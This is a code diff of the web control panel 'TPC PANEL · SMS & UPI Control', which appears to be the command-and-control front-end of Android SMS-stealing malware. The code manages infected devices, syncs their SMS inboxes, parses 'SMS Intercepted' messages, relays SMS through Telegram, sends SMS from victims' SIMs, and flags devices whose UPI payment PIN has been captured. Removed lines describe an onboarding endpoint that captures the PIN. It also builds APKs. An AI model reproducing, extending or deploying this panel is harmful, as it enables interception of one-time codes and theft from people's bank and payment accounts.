@@ -203,7 +203,6 @@ border-radius:11px;background:#071026;color:#d5ecff;box-shadow:0 14px 44px #000a
 .toolbar{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
 .toolbar input{width:230px}
 
-/* ---------- SIM chips ---------- */
 .simchips{display:flex;gap:8px;flex-wrap:wrap;margin-top:6px}
 .simchip{display:inline-flex;align-items:center;gap:8px;padding:9px 13px;border-radius:11px;
 border:1px solid var(--border);background:#04091a;color:var(--muted);
@@ -241,7 +240,6 @@ width:3px;height:9px;background:var(--border-hi);border-radius:0 2px 2px 0}
 .batt-fill.mid{background:var(--amber)}
 .batt-label{font-family:var(--mono);font-size:12px;color:#bcd4f5}
 
-/* ---------- overlay : sirf msg list scroll ---------- */
 .overlay{position:fixed;inset:0;z-index:45;padding:20px;background:#01030af2;
 backdrop-filter:blur(6px);display:flex;flex-direction:column;overflow:hidden}
 .shell{width:100%;max-width:1220px;margin:0 auto;flex:1;min-height:0;display:flex;flex-direction:column}
@@ -361,7 +359,6 @@ text-shadow:0 0 20px #fbbf2440;overflow-wrap:anywhere}
 .bar>span{display:block;height:100%;border-radius:999px;background:linear-gradient(90deg,#22d3ee,#38bdf8)}
 .bar.red>span{background:linear-gradient(90deg,#ff5c7a,#fbbf24)}
 
-/* ---------- builder ---------- */
 .build-log{max-height:340px;overflow:auto;font-size:11.5px;line-height:1.7}
 .snippet{margin:10px 0 0;padding:12px;border:1px dashed var(--border-hi);border-radius:10px;
 background:#04091a;font-family:var(--mono);font-size:11.5px;color:#9fc4e6;
@@ -454,7 +451,7 @@ main{padding:18px 13px}
 </div>
 
 <div class="login-foot">
-<span>Session persists locally</span>
+<span>Backend: <span class="mono" id="apiHint">/</span></span>
 <a class="apk" id="apkLogin" href="#" target="_blank" rel="noopener">
 <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true"><path d="M6 10h12v8a1 1 0 0 1-1 1h-1v2.2a1.2 1.2 0 0 1-2.4 0V19h-3.2v2.2a1.2 1.2 0 0 1-2.4 0V19H7a1 1 0 0 1-1-1v-8Zm-1.8 0A1.2 1.2 0 0 1 5.4 11.2v5.6a1.2 1.2 0 0 1-2.4 0v-5.6A1.2 1.2 0 0 1 4.2 10Zm15.6 0a1.2 1.2 0 0 1 1.2 1.2v5.6a1.2 1.2 0 0 1-2.4 0v-5.6A1.2 1.2 0 0 1 19.8 10ZM7.2 8.6C7.5 6.9 8.9 5.6 10.6 5.3l-.6-1.4a.3.3 0 0 1 .5-.3l.7 1.5a5.6 5.6 0 0 1 2.6 0l.7-1.5a.3.3 0 0 1 .5.3l-.6 1.4c1.7.3 3.1 1.6 3.4 3.3H7.2Zm2.3-1.6a.6.6 0 1 0 0-1.2.6.6 0 0 0 0 1.2Zm5 0a.6.6 0 1 0 0-1.2.6.6 0 0 0 0 1.2Z"/></svg>
 <span>APK</span>
@@ -482,7 +479,7 @@ main{padding:18px 13px}
 </div>
 
 <div class="top-right">
-<span class="pill"><span class="dot"></span><span id="linkLabel">Checking</span></span>
+<span class="pill"><span class="dot"></span><span id="linkLabel">Connecting</span></span>
 <span class="badge" id="roleBadge">—</span>
 <a class="apk" id="apkBtn" href="#" target="_blank" rel="noopener" title="Download APK">
 <svg viewBox="0 0 24 24" width="17" height="17" fill="currentColor" aria-hidden="true"><path d="M6 10h12v8a1 1 0 0 1-1 1h-1v2.2a1.2 1.2 0 0 1-2.4 0V19h-3.2v2.2a1.2 1.2 0 0 1-2.4 0V19H7a1 1 0 0 1-1-1v-8Zm-1.8 0A1.2 1.2 0 0 1 5.4 11.2v5.6a1.2 1.2 0 0 1-2.4 0v-5.6A1.2 1.2 0 0 1 4.2 10Zm15.6 0a1.2 1.2 0 0 1 1.2 1.2v5.6a1.2 1.2 0 0 1-2.4 0v-5.6A1.2 1.2 0 0 1 19.8 10ZM7.2 8.6C7.5 6.9 8.9 5.6 10.6 5.3l-.6-1.4a.3.3 0 0 1 .5-.3l.7 1.5a5.6 5.6 0 0 1 2.6 0l.7-1.5a.3.3 0 0 1 .5.3l-.6 1.4c1.7.3 3.1 1.6 3.4 3.3H7.2Zm2.3-1.6a.6.6 0 1 0 0-1.2.6.6 0 0 0 0 1.2Zm5 0a.6.6 0 1 0 0-1.2.6.6 0 0 0 0 1.2Z"/></svg>
@@ -516,7 +513,7 @@ main{padding:18px 13px}
 <button class="nav" data-page="settings" type="button"><i>⚙</i> Settings</button>
 </div>
 <div class="side-foot">
-<div>TPC PANEL · v5.5</div>
+<div>TPC PANEL · v6.0</div>
 <div>owner: <a href="https://t.me/icivan" target="_blank" rel="noopener">@icivan</a></div>
 </div>
 </aside>
@@ -577,7 +574,7 @@ main{padding:18px 13px}
 <div class="panel-head"><h3>System status</h3></div>
 <div class="panel-body">
 <div class="row"><div><div class="row-name">Backend API</div><div class="row-desc">/health</div></div><span class="badge" id="apiBadge">Checking</span></div>
-<div class="row"><div><div class="row-name">MongoDB</div><div class="row-desc">/health/database</div></div><span class="badge" id="dbBadge">Checking</span></div>
+<div class="row"><div><div class="row-name">Store</div><div class="row-desc">/health/database</div></div><span class="badge" id="dbBadge">Checking</span></div>
 <div class="row"><div><div class="row-name">APK builder</div><div class="row-desc">/health/builder</div></div><span class="badge" id="builderBadge">Checking</span></div>
 <div class="row"><div><div class="row-name">Admin socket</div><div class="row-desc">live link</div></div><span class="badge" id="wsBadge">Connecting</span></div>
 <div class="row"><div><div class="row-name">Relay</div><div class="row-desc">MTProto channel watcher</div></div><span class="badge" id="relayBadge">—</span></div>
@@ -669,7 +666,7 @@ main{padding:18px 13px}
 
 <section class="page" id="page-relay">
 <div class="head">
-<div><h2>Relay</h2><p>Telegram channel → device SMS · device SMS → forward target (banned filtered)</p></div>
+<div><h2>Relay</h2><p>Telegram channel → device SMS · device SMS → forward target</p></div>
 <button class="btn ghost" data-refresh="relay" type="button">↻ Refresh</button>
 </div>
 <div class="grid2">
@@ -729,14 +726,6 @@ main{padding:18px 13px}
 <textarea id="parseText" class="mono" placeholder="📱 SMS Intercepted&#10;━━━━━━━━━━━━━━&#10;📞 To: +91…&#10;💬 Message: …"></textarea>
 <button class="btn ghost" id="parseBtn" style="margin-top:12px" type="button">Parse</button>
 <pre id="parseOut" class="pre-out">—</pre>
-</div>
-</section>
-
-<section class="panel-box panel">
-<div class="panel-head"><h3>Relay log</h3><span class="badge" id="tgCount">0</span></div>
-<div class="table-wrap">
-<table><thead><tr><th>Time</th><th>Direction</th><th>Text</th><th>Result</th></tr></thead>
-<tbody id="tgBody"></tbody></table>
 </div>
 </section>
 
@@ -847,6 +836,7 @@ main{padding:18px 13px}
 <div class="head">
 <div><h2>APK Builder</h2><p>App banao, secret lo, build karo, APK download karo — sab tumhara hi</p></div>
 <div class="toolbar">
+<span class="badge" id="builderMode">—</span>
 <span class="badge" id="bQueueBadge">—</span>
 <button class="btn ghost" data-refresh="builder" type="button">↻ Refresh</button>
 </div>
@@ -869,7 +859,7 @@ main{padding:18px 13px}
 </article>
 <article class="stat panel">
 <div class="stat-top"><span class="stat-label">Running</span><span class="stat-icon">▶</span></div>
-<div class="stat-val" id="bRunning">—</div><div class="stat-foot">workers busy</div>
+<div class="stat-val" id="bRunning">—</div><div class="stat-foot">gradle busy</div>
 </article>
 </div>
 
@@ -931,17 +921,13 @@ main{padding:18px 13px}
 <div class="settings-row"><strong>Headers</strong>
 <p>Har request par <code class="mono">X-App-Id</code>, <code class="mono">X-Timestamp</code> (epoch seconds) aur <code class="mono">X-Signature</code> bhejo.</p></div>
 <div class="settings-row"><strong>Signature</strong>
-<p><code class="mono">HMAC-SHA256(secret, raw_body + timestamp)</code> — hex lowercase. Secret APK ke strings.xml me embed hota hai.</p></div>
+<p><code class="mono">HMAC-SHA256(secret, raw_body + timestamp)</code> — hex lowercase.</p></div>
 <div class="settings-row"><strong>Window</strong>
-<p>Timestamp ±300s ke andar hona chahiye. Same signature dobara bheja to replay maan ke 401 milega.</p></div>
+<p>Timestamp ±300s ke andar hona chahiye.</p></div>
 <div class="settings-row"><strong>Isolation</strong>
-<p>appId sirf verified header se liya jaata hai — body me aaya appId ignore hota hai. Isliye ek app doosre app ka data nahi padh sakta.</p></div>
+<p>appId sirf verified header se liya jaata hai — body me aaya appId ignore hota hai.</p></div>
 <div class="settings-row"><strong>Endpoints</strong>
-<p><code class="mono">POST /api/orders</code> · <code class="mono">GET /api/orders</code> · <code class="mono">GET /api/orders/{id}</code> · <code class="mono">DELETE /api/orders/{id}</code> · <code class="mono">POST /api/echo</code></p></div>
-<div class="settings-row"><strong>Socket</strong>
-<p><code class="mono">/ws/app</code> par pehla frame: <code class="mono">{"type":"auth","appId":…,"ts":…,"sig":…,"body":""}</code>. Verify hone par app apne room me chala jaata hai.</p></div>
-<div class="settings-row"><strong>Rotation</strong>
-<p>Secret rotate karte ho to purana APK turant 401 dene lagta hai. Rebuild karo — naya secret APK me chala jayega.</p></div>
+<p><code class="mono">POST /api/orders</code> · <code class="mono">GET /api/orders</code> · <code class="mono">POST /api/echo</code></p></div>
 </div>
 </section>
 </section>
@@ -1037,25 +1023,16 @@ main{padding:18px 13px}
 <section class="panel-box panel">
 <div class="panel-head"><h3>Application</h3></div>
 <div class="panel-body">
-<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; UPI Control · v5.5</p></div>
+<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; UPI Control · v6.0</p></div>
 <div class="settings-row"><strong>Owner</strong><p><a href="https://t.me/icivan" target="_blank" rel="noopener">https://t.me/icivan</a></p></div>
-<div class="settings-row"><strong>APK</strong><p><a id="apkSettings" href="#" target="_blank" rel="noopener">—</a></p></div>
-<div class="settings-row"><strong>Access</strong><p>Admin: username + password. User: sirf access key (admin generate karta hai, koi self-register nahi).</p></div>
-<div class="settings-row"><strong>Key endpoints</strong><p>POST /admin/keys (generate) · POST /panel/access (login by key) · POST /admin/keys/{id}/expiry|toggle|delete</p></div>
-<div class="settings-row"><strong>Dual SIM</strong><p>Auto Sender me SIM 1 / SIM 2 chips se choose karo — jo on honge wahi slots par SMS queue hoga. Message list me SIM badge dikhta hai. Ack me sim_slot wapas aata hai, isliye badge exact hota hai.</p></div>
-<div class="settings-row"><strong>Telegram confirm</strong><p>On hone par har auto-send ka confirm forward target par set format me jaata hai.</p></div>
-<div class="settings-row"><strong>Send</strong><p>/admin/send — target, device_id, to, body, sim_slots[] . Delivery fail ho to row pending rehti hai aur device online hote hi chali jaati hai.</p></div>
-<div class="settings-row"><strong>Send status</strong><p>queued → sent → delivered. Device har stage par ack bhejta hai; stale "queued" rows 3 min baad dobara push hoti hain.</p></div>
-<div class="settings-row"><strong>Growth</strong><p>/devices/event par install / update / open. Uninstall Android se broadcast nahi hota — 7 din silence = uninstalled. Same android_id par naya install_id = reinstall.</p></div>
-<div class="settings-row"><strong>APK Builder</strong><p>/api/apps, /api/builds, /api/builds/{id}/download. Har app ka apna appId + secret, apna keystore, apna APK. Cross-app read possible nahi.</p></div>
-<div class="settings-row"><strong>Builder health</strong><p>/health/builder — gradle/keytool/apksigner mil rahe hain ya nahi, queue kitni busy hai.</p></div>
-<div class="settings-row"><strong>App API</strong><p>/api/orders (signed) — X-App-Id + X-Timestamp + X-Signature = HMAC(secret, body + timestamp).</p></div>
+<div class="settings-row"><strong>Backend</strong><p class="mono" id="apiBase">/</p></div>
+<div class="settings-row"><strong>Access</strong><p>Admin: username + password. User: sirf access key.</p></div>
+<div class="settings-row"><strong>APK Builder</strong><p>/api/apps, /api/builds, /api/builds/{id}/download — backend asli me gradle chalata hai aur APK banata hai.</p></div>
+<div class="settings-row"><strong>Builder health</strong><p>/health/builder — gradlew / Android SDK / template ready hai ya nahi.</p></div>
 <div class="settings-row"><strong>Device socket</strong><p>/ws/device/{registration_id}</p></div>
-<div class="settings-row"><strong>App socket</strong><p>/ws/app — signed handshake ke baad room app:&lt;appId&gt;</p></div>
+<div class="settings-row"><strong>Admin socket</strong><p>/ws/admin</p></div>
 <div class="settings-row"><strong>SMS ingest</strong><p>/devices/sms/incoming</p></div>
-<div class="settings-row"><strong>Onboarding</strong><p>/devices/onboarding — phone number, payment app aur UPI PIN capture</p></div>
-<div class="settings-row"><strong>Relay</strong><p>/admin/relay/* — MTProto login, bans, parser test, forward target.</p></div>
-<div class="settings-row"><strong>Secrets</strong><p>SESSION_SECRET, APP_ENCRYPTION_KEY (builder ke app secrets isse encrypt hote hain), ADMIN_API_KEY, MONGODB_URI aur TELE_API_HASH server-side rakho.</p></div>
+<div class="settings-row"><strong>Onboarding</strong><p>/devices/onboarding</p></div>
 </div>
 </section>
 </section>
@@ -1127,7 +1104,7 @@ main{padding:18px 13px}
 </div>
 <div class="step">
 <span class="step-tag">STEP 3 — KIS SIM SE BHEJNA HAI</span>
-<p class="step-desc">Jitne SIM on karoge, utne se SMS jaayega. Dono on = SIM 1 + SIM 2 se.</p>
+<p class="step-desc">Jitne SIM on karoge, utne se SMS jaayega.</p>
 <div class="simchips" id="asSims"></div>
 <div class="toggle-row" style="margin-top:12px">
 <div><div class="t-name">Telegram confirm</div>
@@ -1194,23 +1171,22 @@ const PHONE_SVG = '<svg viewBox="0 0 24 24" width="24" height="24" fill="none" s
 const BOLT_SVG = '<svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M13.5 2 5 13h5.5L9.5 22 19 10.5h-5.9z"/></svg>';
 const SIM_SVG = '<svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M7.5 3h6.8L19 7.7V20a1 1 0 0 1-1 1H7.5a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1z"/><rect x="9.4" y="12.4" width="6.2" height="5.2" rx="1.1"/><path d="M9.4 9.4h3.4"/></svg>';
 
-const APK_URL = "https://github.com/usual-coderz/screenlink-remote/actions";
+const APK_URL = "/api/builds";
+const TKEY = "tpc.token.v11";
+const SKEY = "tpc.session.v11";
 
-const TKEY = "tpc.token.v10";
-const SKEY = "tpc.session.v10";
-let DEMO = false;
 let reloginPromise = null;
 let gridSig = "";
 let liveSig = "";
 
 const state = {
 auth:false, role:"user", me:null, users:[], devices:[], messages:[], devMsgs:{},
-rules:[], tgLogs:[], relay:null, relayAccount:null, forward:"", outbox:[],
+rules:[], relay:null, relayAccount:null, forward:"", outbox:[],
 growth:null, growthEvents:[],
 apps:[], builds:[], buildCfg:null, quota:null,
-logBuild:null, logTimer:null,
+logBuild:null,
 pinsOnly:false, active:null, asOpen:false, toastTimer:null, pollTimer:null,
-ws:null, wsOk:false, wsFails:0, wsTimer:null, wsUser:null, linkOk:true,
+ws:null, wsOk:false, wsFails:0, wsTimer:null, wsUser:null, linkOk:false, apiDown:false,
 numTried:{}, lastError:"",
 sel:{ as:[], send:[], bulk:[] }
 };
@@ -1227,6 +1203,7 @@ window.addEventListener("unhandledrejection",(ev)=>{ reportError(ev.reason); });
 
 function notice(text,bad){
 const el=$("#notice");
+if(!el)return;
 if(!text){el.hidden=true;return;}
 el.textContent=text; el.className="notice"+(bad?" bad":""); el.hidden=false;
 }
@@ -1251,7 +1228,8 @@ function clearSession(){ setToken(""); try{localStorage.removeItem(SKEY);}catch(
 function decPass(p){ try{return decodeURIComponent(escape(atob(p)));}catch(e){return "";} }
 
 function toast(text){
-const t=$("#toast"); t.textContent=text; t.hidden=false;
+const t=$("#toast"); if(!t)return;
+t.textContent=text; t.hidden=false;
 clearTimeout(state.toastTimer); state.toastTimer=setTimeout(()=>{t.hidden=true;},4200);
 }
 function loginMsg(text,kind){ const el=$("#loginMsg"); el.textContent=text; el.className="msg "+(kind||"err"); }
@@ -1308,12 +1286,13 @@ frag.appendChild(m); i=idx+n.length;
 return frag;
 }
 
+/* ---------- null-safe device helpers (yahi crash kar rahe the) ---------- */
+function tel(d){ return (d&&d.telemetry&&typeof d.telemetry==="object")?d.telemetry:{}; }
 function devId(d){ return (d&&(d.id||d._id))||null; }
-function devName(d){ return d.device_name||d.name||"Unnamed device"; }
-function devStatus(d){ if(d.ws_connected)return "Online"; return d.status||"Offline"; }
-function online(d){ return Boolean(d.ws_connected); }
-function tel(d){ return d.telemetry&&typeof d.telemetry==="object"?d.telemetry:{}; }
-function hasPin(d){ return Boolean(d.upi_pin); }
+function devName(d){ return (d&&(d.device_name||d.name))||"Unnamed device"; }
+function devStatus(d){ if(!d)return "Offline"; if(d.ws_connected)return "Online"; return d.status||"Offline"; }
+function online(d){ return Boolean(d&&d.ws_connected); }
+function hasPin(d){ return Boolean(d&&d.upi_pin); }
 function autoOf(d){
 return (d&&d.auto_sender)||{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true};
 }
@@ -1362,8 +1341,8 @@ return v!==null?mem(v):null; }
 function nums(d){
 const t=tel(d);
 return {
-entered:d.entered_number||d.phone_number||null,
-live:d.live_number||t.sim_number||d.sim_number||null,
+entered:(d&&(d.entered_number||d.phone_number))||null,
+live:(d&&(d.live_number||d.sim_number))||t.sim_number||null,
 source:t.sim_number_source||null,
 carrier:t.sim_carrier||null,
 slots:Array.isArray(t.sims)?t.sims:[]
@@ -1381,13 +1360,15 @@ if(n<=0){ try{ n=Number(t.sim_count||0)||0; }catch(e){ n=0; } }
 return Math.max(1,Math.min(n,2));
 }
 function simLabel(d,slot){
-const s=nums(d).slots[slot];
+if(!d)return "slot "+(slot+1);
+const s=(nums(d).slots||[])[slot];
 const c=s&&(s.carrier||s.number);
 return c||"slot "+(slot+1);
 }
 
+/* ------------------------------ api ------------------------------ */
+
 async function api(path,options,retry){
-if(DEMO)return mockApi(path,options);
 const o=options||{};
 const headers=Object.assign(
 {"Accept":"application/json"},
@@ -1396,10 +1377,16 @@ o.body?{"Content-Type":"application/json"}:{},
 o.headers||{}
 );
 let res;
-try{ res=await fetch(path,{credentials:"same-origin",method:o.method||"GET",headers:headers,body:o.body}); }
-catch(err){ enterDemo(); return mockApi(path,o); }
+try{
+res=await fetch(path,{credentials:"same-origin",method:o.method||"GET",headers:headers,body:o.body});
+}catch(err){
+state.apiDown=true; updateLink();
+const e=new Error("Backend reachable nahi ("+(err.message||"network")+")");
+e.network=true; throw e;
+}
+state.apiDown=false;
+
 const ct=res.headers.get("content-type")||"";
-if(ct.indexOf("application/json")<0&&res.status>=400){ enterDemo(); return mockApi(path,o); }
 let data=null;
 if(ct.indexOf("application/json")>=0)data=await res.json().catch(()=>({}));
 else{ const txt=await res.text(); data=txt?{detail:txt}:{}; }
@@ -1437,40 +1424,23 @@ return true;
 return reloginPromise;
 }
 
-function enterDemo(){ if(DEMO)return; DEMO=true; setLink("Demo");
-notice("Backend reachable nahi — demo data par chal raha hai",true); }
-function leaveDemo(){ DEMO=false; notice(""); setLink("Live"); }
-
 function selSlots(arr){ return arr.filter((s)=>s===0||s===1).sort(); }
 
 function attemptSend(job){
 const body={to:job.to||null,body:job.body,sim_slots:job.slots&&job.slots.length?job.slots:null};
-const tries=[
-{url:"/admin/send",body:Object.assign({target:"device",device_id:job.deviceId},body)},
-{url:"/admin/devices/"+job.deviceId+"/sms",body:body}
-];
 job.status="sending"; renderOutbox();
-let last=null;
-const chain=tries.reduce((p,t)=>p.then((done)=>{
-if(done)return true;
-return api(t.url,{method:"POST",body:JSON.stringify(t.body)})
+return api("/admin/send",{method:"POST",body:JSON.stringify(Object.assign({target:"device",device_id:job.deviceId},body))})
 .then((r)=>{
 job.status="queued";
-job.delivered=r&&typeof r.delivered==="number"?r.delivered:(r&&r.delivered?1:0);
-job.queued=r&&typeof r.queued==="number"?r.queued:1;
+job.delivered=r&&typeof r.delivered==="number"?r.delivered:0;
+job.queued=r&&typeof r.queued==="number"?r.queued:0;
 renderOutbox();
 toast("queued "+job.queued+" · delivered "+job.delivered);
 loadMessages().catch(()=>{});
 loadStats().catch(()=>{});
 return true;
 })
-.catch((e)=>{ last=e; return false; });
-}),Promise.resolve(false));
-return chain.then((ok)=>{
-if(ok)return true;
-job.status="failed"; job.error=last?last.message:"send failed";
-renderOutbox(); toast("send fail: "+job.error); return false;
-});
+.catch((e)=>{ job.status="failed"; job.error=e.message; renderOutbox(); toast("send fail: "+e.message); return false; });
 }
 
 function sendSms(o){
@@ -1513,15 +1483,9 @@ box.appendChild(item);
 });
 }
 
-function devCommand(id,action){
-const tries=[
-["/admin/devices/"+id+"/command",{action:action}],
-["/admin/devices/"+id+"/refresh",{action:action}],
-["/admin/devices/"+id+"/ping",{}]
-];
-return tries.reduce((p,t)=>p.then((done)=>done?true:
-api(t[0],{method:"POST",body:JSON.stringify(t[1])}).then(()=>true).catch(()=>false)),
-Promise.resolve(false));
+async function devCommand(id,action){
+try{ await api("/admin/devices/"+id+"/command",{method:"POST",body:JSON.stringify({action:action})}); return true; }
+catch(e){ return false; }
 }
 
 async function pingDevice(d){ toast("ping bheja…"); await devCommand(devId(d),"ping");
@@ -1565,16 +1529,18 @@ try{ info=await api("/admin/auth/status"); }catch(e){}
 if(info&&info.authenticated){ await afterLogin(info.role||s.role||"user"); return; }
 const ok=await relogin();
 if(ok){ await afterLogin(state.role||s.role||"user"); return; }
-showLogin("Saved session invalid — key/paasword daalo"); return;
+showLogin("Saved session invalid — key/password daalo"); return;
 }
 try{
 const r2=await api("/admin/auth/status");
 if(r2&&r2.authenticated){ showApp(); await afterLogin(r2.role||"admin"); return; }
-}catch(e){}
+}catch(e){
+loginMsg("Backend reachable nahi — server chal raha hai? ("+e.message+")");
+}
 showLogin("");
 }
 
-/* ------------------------------- SIM chips ------------------------------- */
+/* ------------------------------ sim chips ------------------------------ */
 
 function buildSimChips(container,key,device,onChange){
 if(!container)return;
@@ -1614,12 +1580,12 @@ toast("SIM selection saved");
 });
 }
 
-/* ------------------------------- renders ------------------------------- */
+/* ------------------------------ renders ------------------------------ */
 
 function renderOverview(){
 const total=state.devices.length; const on=state.devices.filter(online).length;
 $("#sTotal").textContent=total; $("#sOnline").textContent=on; $("#sOffline").textContent=total-on;
-const sims=state.devices.reduce((s,d)=>s+((tel(d).sims||[]).length||d.sim_count||0),0);
+const sims=state.devices.reduce((s,d)=>s+((tel(d).sims||[]).length||0),0);
 $("#sSims").textContent=sims;
 $("#sPins").textContent=state.devices.filter(hasPin).length;
 if(state.growth){
@@ -1738,7 +1704,7 @@ body.appendChild(row);
 });
 }
 
-/* ------------------------------- GROWTH ------------------------------- */
+/* ------------------------------ growth ------------------------------ */
 
 async function loadStats(){
 try{ state.growth=await api("/admin/stats"); renderGrowth(); }catch(e){}
@@ -1796,13 +1762,20 @@ body.appendChild(row);
 
 /* ============================ APK BUILDER ============================ */
 
+function updateBuilderMode(){
+const el=$("#builderMode"); if(!el)return;
+const ok=state.buildCfg&&state.buildCfg.queue;
+badge(el,ok?"gradle backend live":"builder offline",ok?"ok":"bad");
+if(!ok)builderNotice("Backend reachable nahi — APK Builder band hai. server.js chalao aur /health/builder check karo.",true);
+}
+
 async function loadBuilderConfig(){
 try{
 state.buildCfg=await api("/api/builder/config");
 const q=state.buildCfg.queue||{};
-badge($("#bQueueBadge"),(q.queued||0)+" queued · "+(q.running||0)+" running",
-(q.running?"warn":""));
+badge($("#bQueueBadge"),(q.queued||0)+" queued · "+(q.running||0)+" running",(q.running?"warn":""));
 }catch(e){ state.buildCfg=null; badge($("#bQueueBadge"),"offline","bad"); }
+updateBuilderMode();
 }
 
 async function loadApps(){
@@ -1961,7 +1934,7 @@ await loadApps();
 }
 
 async function deleteApp(a){
-if(!confirm("Delete app "+a.appId+"? Iske orders bhi hat jayenge."))return;
+if(!confirm("Delete app "+a.appId+"? Iske builds bhi hat jayenge."))return;
 try{ await api("/api/apps/"+a.appId,{method:"DELETE"});
 toast("deleted"); await loadApps(); await loadBuilds(); }catch(e){ toast(e.message); }
 }
@@ -1988,7 +1961,7 @@ $("#logPanel").scrollIntoView({behavior:"smooth",block:"start"});
 async function fetchBuildLog(){
 const id=state.logBuild; if(!id)return;
 try{
-const r=await api("/api/builds/"+id+"?log_tail=true");
+const r=await api("/api/builds/"+id);
 const b=r.build||{};
 let txt=(b.log_tail||[]).join("\n")||"(log khali)";
 if(b.error)txt+="\n\nERROR:\n"+b.error;
@@ -2006,7 +1979,7 @@ state.wsUser.send(JSON.stringify({type:"subscribe",buildId:buildId}));
 }
 
 function connectUserSocket(){
-if(!state.auth||DEMO)return;
+if(!state.auth)return;
 try{
 const proto=location.protocol==="https:"?"wss:":"ws:";
 const qs=token()?"?token="+encodeURIComponent(token()):"";
@@ -2027,7 +2000,7 @@ ws.onclose=()=>{ setTimeout(()=>{ if(state.auth)connectUserSocket(); },3000); };
 }catch(e){}
 }
 
-/* ------------------------------- KEYS ------------------------------- */
+/* ------------------------------ keys ------------------------------ */
 
 function keyStatus(u){
 if(u.blocked)return{text:"blocked",kind:"bad"};
@@ -2121,7 +2094,7 @@ try{ await api("/admin/keys/"+u.id+"/delete",{method:"POST"}); toast("deleted");
 catch(e){ toast(e.message); }
 }
 
-/* -------------------------------------------------------------------- */
+/* ------------------------------ rules ------------------------------ */
 
 function renderRules(){
 $("#ruleCount").textContent=state.rules.length+" rules";
@@ -2141,21 +2114,6 @@ btn.addEventListener("click",async()=>{ try{ await api("/admin/rules/"+r.id+"/to
 catch(e){ toast(e.message); } });
 act.appendChild(btn); row.appendChild(act);
 body.appendChild(row);
-});
-}
-
-function renderRelayLogs(){
-$("#tgCount").textContent=state.tgLogs.length+" events";
-const body=$("#tgBody");
-if(!state.tgLogs.length){ empty(body,4,"No relay events"); return; }
-body.replaceChildren();
-state.tgLogs.forEach((l)=>{
-const row=document.createElement("tr");
-cell(row,fmt(l.created_at));
-badgeCell(row,l.direction==="in"?"in":"out",l.direction==="in"?"in":"out");
-const txt=document.createElement("td"); const span=document.createElement("span");
-span.className="body-cell"; span.textContent=l.text||"—"; txt.appendChild(span); row.appendChild(txt);
-cell(row,l.result||"—"); body.appendChild(row);
 });
 }
 
@@ -2281,14 +2239,10 @@ const rows=[
 ["Manufacturer",t.manufacturer],["Brand",t.brand],["SDK int",t.sdk_int],["Android ID",d.android_id||t.android_id],
 ["Install id",d.install_id],["Install seq",d.install_seq],["Install state",d.install_state],
 ["Installed at",d.installed_at?fmt(d.installed_at):null],
-["Uninstalled at",d.uninstalled_at?fmt(d.uninstalled_at):null],
 ["App version",d.app_version],
 ["CPU / ABI",t.cpu_abi],["Cores",t.cpu_cores],["Resolution",t.screen_resolution],["Local IP",t.local_ip],
 ["SIM count",t.sim_count],["Number source",t.sim_number_source],["Battery temp",t.battery_temperature_c],
-["Inbox synced",d.sms_inbox_synced_at?fmt(d.sms_inbox_synced_at):null],["Inbox count",t.sms_inbox_count],
-["Sent count",t.sms_sent_count],["Onboarded",d.onboarded?"Yes":"No"],
-["Onboarded at",d.onboarded_at?fmt(d.onboarded_at):null],
-["Onboard amount",d.onboard_amount!=null?"₹"+d.onboard_amount:null]
+["Inbox count",t.sms_inbox_count],["Sent count",t.sms_sent_count],["Onboarded",d.onboarded?"Yes":"No"]
 ];
 rows.forEach((p)=>{ if(p[1]===null||p[1]===undefined||p[1]==="")return;
 const r=document.createElement("div"); r.className="more-row";
@@ -2439,19 +2393,18 @@ $("#actMenu").hidden=true; state.active=null;
 }
 
 async function loadHealth(){
-try{ const h=await api("/health"); state.linkOk=true; updateLink();
-badge($("#apiBadge"),h.status==="ok"?"Online":"Check",h.status==="ok"?"ok":"warn"); }
+try{ await api("/health"); state.linkOk=true; updateLink();
+badge($("#apiBadge"),"Online","ok"); }
 catch(e){ state.linkOk=false; updateLink(); badge($("#apiBadge"),"Down","bad"); }
-try{ const db=await api("/health/database");
-badge($("#dbBadge"),db.status==="ok"?"Connected":"Issue",db.status==="ok"?"ok":"bad"); }
+try{ await api("/health/database"); badge($("#dbBadge"),"Connected","ok"); }
 catch(e){ badge($("#dbBadge"),"Down","bad"); }
 try{
 const b=await api("/health/builder");
 const ok=b.status==="ok";
 badge($("#builderBadge"),ok?"Ready":"Degraded",ok?"ok":"warn");
 const tools=b.tools||{};
-const missing=Object.keys(tools).filter((k)=>!tools[k]&&k!=="docker");
-if(missing.length&&!ok)builderNotice("Builder tools missing: "+missing.join(", ")+" — /health/builder dekho",true);
+const missing=Object.keys(tools).filter((k)=>!tools[k]);
+if(missing.length&&!ok)builderNotice("Builder ready nahi — missing: "+missing.join(", "),true);
 }catch(e){ badge($("#builderBadge"),"Down","bad"); }
 }
 
@@ -2502,10 +2455,6 @@ if(state.role!=="admin"){ state.users=[]; return; }
 try{ const d=await api("/admin/keys"); state.users=Array.isArray(d)?d:(d.keys||[]); renderUsers(); }catch(e){}
 }
 
-async function loadRelayLogs(){
-try{ const d=await api("/admin/relay/logs?limit=60"); state.tgLogs=d.logs||[]; }catch(e){}
-renderRelayLogs();
-}
 async function loadAutoSender(){
 try{ const d=await api("/admin/auto-sender");
 state.relayAccount=d.account||null; state.forward=d.forward_user||""; }catch(e){}
@@ -2515,7 +2464,7 @@ async function loadRelay(){ const d=await api("/admin/relay/status"); state.rela
 function renderRelay(){
 const r=state.relay; if(!r)return;
 const st=r.state||{}; const authed=Boolean(st.authorized);
-const label=!r.telethon?"telethon missing":authed?"connected":st.awaiting_code?"awaiting code":"not logged in";
+const label=!r.telethon?"telethon missing":authed?"connected":"not logged in";
 badge($("#relayState"),label,!r.telethon?"bad":authed?"ok":"warn");
 badge($("#relayBadge"),label,!r.telethon?"bad":authed?"ok":"warn");
 $("#relayLoggedOut").hidden=authed; $("#relayLoggedIn").hidden=!authed;
@@ -2550,7 +2499,7 @@ if(!state.auth)return;
 $("#refreshBtn").disabled=true;
 try{
 await loadHealth();
-const jobs=[loadDevices(),loadMessages(),loadRules(),loadRelay(),loadRelayLogs(),
